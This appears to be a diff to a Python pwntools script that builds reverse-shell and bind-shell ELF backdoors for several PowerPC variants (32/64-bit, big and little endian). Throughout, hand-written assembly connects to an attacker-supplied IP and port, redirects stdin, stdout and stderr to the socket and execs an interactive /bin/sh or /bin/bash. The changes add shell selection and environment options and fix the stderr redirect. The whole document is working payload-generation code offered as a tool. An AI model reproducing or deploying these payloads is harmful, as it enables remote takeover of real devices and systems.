@@ -16,7 +16,7 @@ bind 0x147
 accept 0x14a
 '''
 
-def powerpc_backdoor(reverse_ip, reverse_port, filename = None):
+def powerpc_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename = None):
 	context.arch = 'powerpc'
 	context.endian = 'big'
 	context.bits = '32'
@@ -65,6 +65,7 @@ def powerpc_backdoor(reverse_ip, reverse_port, filename = None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -73,22 +74,59 @@ def powerpc_backdoor(reverse_ip, reverse_port, filename = None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
-	sc
-	lis    r9, 0x2f62
-	ori    r9, r9, 26990
-	stw   r9, 48(r31)
-	xor  r9, r9, r9
-	lis    r9, 0x2f73
-	ori   r9, r9, 26624
-	stw   r9, 52(r31)
-	addi  r3, r31,0x30
-	stwu  r3, 0(r31)
-	mr    r4, r31
-	xor   r5, r5, r5
-	li    r0, 0xb
+	li    r4,2
 	sc
 	'''
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode += '''
+		lis    9, 0x2f62
+		ori    9, 9, 26990
+		stw    9, 48(31)
+		xor    9, 9, 9
+		lis    9, 0x2f73
+		ori    9, 9, 26624
+		stw    9, 52(31)
+		lis    9, 0x2d69
+		stw    9, 60(31)
+		addi   3, 31,0x30
+		stwu   3, 0(31)
+		addi   11, 31,60
+		stwu   11, 4(31)
+		addi   4, 31, -4
+		xor    5, 5, 5
+		li     0, 0xb
+		sc
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode += '''
+		lis    9, 0x2f62
+		ori    9, 9, 26990
+		stw    9, 48(31)
+		xor    9, 9, 9
+		lis    9, 0x2f62
+		ori    9, 9, 24947
+		stw    9, 52(31)
+		lis    9, 0x6800
+		ori    9, 9, 0
+		stw    9, 56(31)
+		lis    9, 0x2d69
+		stw    9, 60(31)
+		addi   3, 31,0x30
+		stwu   3, 0(31)
+		addi   11, 31,60
+		stwu   11, 4(31)
+		addi   4, 31, -4
+		xor    5, 5, 5
+		li     0, 0xb
+		sc
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if (envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
@@ -182,6 +220,7 @@ def ppc_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -190,7 +229,7 @@ def ppc_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
+	li    r4,2
 	sc
 	li    r9, 0x2f62
 	sth   r9, 48(r31)
@@ -284,6 +323,7 @@ def ppcle_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -292,7 +332,7 @@ def ppcle_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
+	li    r4,2
 	sc
 	lis    r9, 0x6e69
 	ori    r9, r9, 0x622f
@@ -386,6 +426,7 @@ def ppc64le_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -394,7 +435,7 @@ def ppc64le_reverse_sl(reverse_ip, reverse_port, filename = None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
+	li    r4,2
 	sc
 	lis    r9, 0x6e69
 	ori    r9, r9, 0x622f
@@ -441,7 +482,7 @@ def ppc64le_reverse_sl(reverse_ip, reverse_port, filename = None):
 can't exame it 
 '''
 
-def powerpcle_backdoor(reverse_ip, reverse_port, filename=None):
+def powerpcle_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename=None):
 	context.arch = 'powerpc'
 	context.endian = 'little'
 	context.bits = '32'
@@ -493,6 +534,7 @@ def powerpcle_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -501,22 +543,63 @@ def powerpcle_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
-	sc
-	lis    r9, 0x6e69
-	ori    r9, r9, 0x622f
-	stw   r9, 48(r31)
-	xor  r9, r9, r9
-	lis    r9, 0x68
-	ori   r9, r9, 0x732f
-	stw   r9, 52(r31)
-	addi  r3, r31,0x30
-	stwu  r3, 0(r31)
-	mr    r4, r31
-	xor   r5, r5, r5
-	li    r0, 0xb
+	li    r4,2
 	sc
 	'''
+
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode += '''
+		lis    r9, 0x6e69
+		ori    r9, r9, 0x622f
+		stw   r9, 48(r31)
+		xor  r9, r9, r9
+		lis    r9, 0x68
+		ori   r9, r9, 0x732f
+		stw   r9, 52(r31)
+		addi  r3, r31,0x30
+		stwu  r3, 0(r31)
+		xor   r5, r5, r5
+		stw   r5, 64(r31)
+		lis   r9, 0x692d
+		stw   r9, 60(r31)
+		addi  r11, r31,62
+		stwu  r11, 4(r31)
+		addi  r4, r31, -4
+		xor   r5, r5, r5
+		li    r0, 0xb
+		sc
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode += '''
+		lis    r9, 0x6e69
+		ori    r9, r9, 0x622f
+		stw   r9, 48(r31)
+		xor  r9, r9, r9
+		lis    r9, 0x7361
+		ori   r9, r9, 0x622f
+		stw   r9, 52(r31)
+		lis    9, 0
+		ori   r9, r9, 0x68
+		stw    9, 56(31)
+		addi  r3, r31,0x30
+		stwu  r3, 0(r31)
+		xor   r5, r5, r5
+		stw   r5, 64(r31)
+		lis   r9, 0x692d
+		stw   r9, 60(r31)
+		addi  r11, r31,62
+		stwu  r11, 4(r31)
+		addi  r4, r31, -4
+		li    r0, 0xb
+		sc
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode = asm(shellcode % (handle_port_2,handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
@@ -565,7 +648,7 @@ pwoerpc64 reverse_shell_file
 add 2022.11.12
 '''
 
-def powerpc64_backdoor(reverse_ip, reverse_port, filename=None):
+def powerpc64_backdoor(shell_path ,reverse_ip, reverse_port,envp ,filename=None):
 	context.arch = 'powerpc64'
 	context.endian = 'big'
 	context.bits = '64'
@@ -614,6 +697,7 @@ def powerpc64_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -622,26 +706,65 @@ def powerpc64_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
-	sc
-	li    r9, 0x2f62
-	sth   r9, 48(r31)
-	li    r9, 0x696e
-	sth   r9, 50(r31)
-	li    r9, 0x2f73
-	sth   r9, 52(r31)
-	li    r9, 0x6800
-	sth   r9, 54(r31)
-	addi  r3, r31,0x30
-	std  r3, 0(r31)
-	mr    r4, r31
-	xor   r5, r5, r5
-	li    r0, 0xb
+	li    r4,2
 	sc
 	'''
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode += '''
+		lis    9, 0x2f62
+		ori    9, 9, 26990
+		stw    9, 48(31)
+		xor    9, 9, 9
+		lis    9, 0x2f73
+		ori    9, 9, 26624
+		stw    9, 52(31)
+		xor    5, 5, 5
+		stw    5, 64(31)
+		lis    9, 0x2d69
+		stw    9, 60(31)
+		addi   3, 31,0x30
+		std   3, 0(31)
+		addi   11, 31,60
+		std   11, 8(31)
+		std    5, 16(31)
+		mr    4, 31
+		li     0, 0xb
+		sc
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode += '''
+		lis    9, 0x2f62
+		ori    9, 9, 26990
+		stw    9, 48(31)
+		xor    9, 9, 9
+		lis    9, 0x2f62
+		ori    9, 9, 24947
+		stw    9, 52(31)
+		lis    9, 0x6800
+		ori    9, 9, 0
+		stw    9, 56(31)
+		xor    5, 5, 5
+		stw    5, 64(31)
+		lis    9, 0x2d69
+		stw    9, 60(31)
+		addi   3, 31,0x30
+		std   3, 0(31)
+		addi   11, 31,60
+		std   11, 8(31)
+		std   5,  16(31)
+		mr    r4, r31
+		li     0, 0xb
+		sc
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	#print(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
 	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
-	#print(shellcode)
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
@@ -689,7 +812,7 @@ def powerpc64_backdoor(reverse_ip, reverse_port, filename=None):
 ip addres need change,
 '''
 
-def powerpc64le_backdoor(reverse_ip, reverse_port, filename=None):
+def powerpc64le_backdoor(shell_path, reverse_ip, reverse_port, envp ,filename=None):
 	context.arch = 'powerpc64'
 	context.endian = 'little'
 	context.bits = '64'
@@ -741,6 +864,7 @@ def powerpc64le_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -749,26 +873,68 @@ def powerpc64le_backdoor(reverse_ip, reverse_port, filename=None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
-	sc
-	lis    r9, 0x6e69
-	ori    r9, r9, 0x622f
-	stw   r9, 48(r31)
-	xor  r9, r9, r9
-	lis    r9, 0x68
-	ori   r9, r9, 0x732f
-	stw   r9, 52(r31)
-	addi  r3, r31,0x30
-	std  r3, 0(r31)
-	mr    r4, r31
-	xor   r5, r5, r5
-	li    r0, 0xb
+	li    r4,2
 	sc
 	'''
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode += '''
+		lis    r9, 0x6e69
+		ori    r9, r9, 0x622f
+		stw   r9, 48(r31)
+		xor  r9, r9, r9
+		lis    r9, 0x68
+		ori   r9, r9, 0x732f
+		stw   r9, 52(r31)
+		addi  r3, r31,0x30
+		std  r3, 0(r31)
+		xor   r5, r5, r5
+		stw   r5, 64(r31)
+		lis   r9, 0x692d
+		stw   r9, 60(r31)
+		addi  r11, r31,62
+		std  r11, 8(r31)
+		std  r5,  16(r31)
+		mr   r4, r31
+		li    r0, 0xb
+		sc
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode += '''
+		lis    r9, 0x6e69
+		ori    r9, r9, 0x622f
+		stw   r9, 48(r31)
+		xor  r9, r9, r9
+		lis    r9, 0x7361
+		ori   r9, r9, 0x622f
+		stw   r9, 52(r31)
+		lis    9, 0
+		ori   r9, r9, 0x68
+		stw    9, 56(31)
+		addi  r3, r31,0x30
+		std  r3, 0(r31)
+		xor   r5, r5, r5
+		stw   r5, 64(r31)
+		lis   r9, 0x692d
+		stw   r9, 60(r31)
+		addi  r11, r31,62
+		std  r11, 8(r31)
+		std  r5, 16(r31)
+		mr    r4, r31
+		li    r0, 0xb
+		sc
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
+
 	#print(shellcode%(handle_port, handle_ip_3, handle_ip_2, handle_ip_1, handle_ip_0))
 	#shellcode = asm(shellcode%(handle_port, handle_ip_3, handle_ip_2, handle_ip_1, handle_ip_0))
 	shellcode = asm(shellcode%(handle_port_2 , handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))
-	#print(shellcode)
+
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
@@ -860,6 +1026,7 @@ def ppc64_reverse_sl(reverse_ip, reverse_port, filename=None):
 	li    r5, 0x10
 	li    r0, 0x148
 	sc
+	xor   r5, r5, r5
 	mr    r3,r17
 	li    r4,0
 	li    r0,0x3f
@@ -868,7 +1035,7 @@ def ppc64_reverse_sl(reverse_ip, reverse_port, filename=None):
 	li    r4,1
 	sc
 	mr    r3,r17
-	li    r4,1
+	li    r4,2
 	sc
 	li    r9, 0x2f62
 	sth   r9, 48(r31)
@@ -953,6 +1120,7 @@ def powerpc_bind_shell(listen_port , passwd, filename= None):
 	li   r5, 0x10
 	li   r0, 0x147
 	sc
+	xor  r5, r5, r5
 	mr   r3, r17
 	li   r4, 0x101
 	li   r0, 0x149
